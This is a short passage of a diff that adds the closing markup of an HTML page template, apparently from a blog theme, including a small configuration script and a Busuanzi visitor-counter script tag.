+    <div class="sidebar-tag-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var jsInfo = {
+        root: '/'
+    }
+</script>
+    <!-- 不蒜子  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ统计  -->
+    
+    </div>
+    </body>
+</html>
+
+
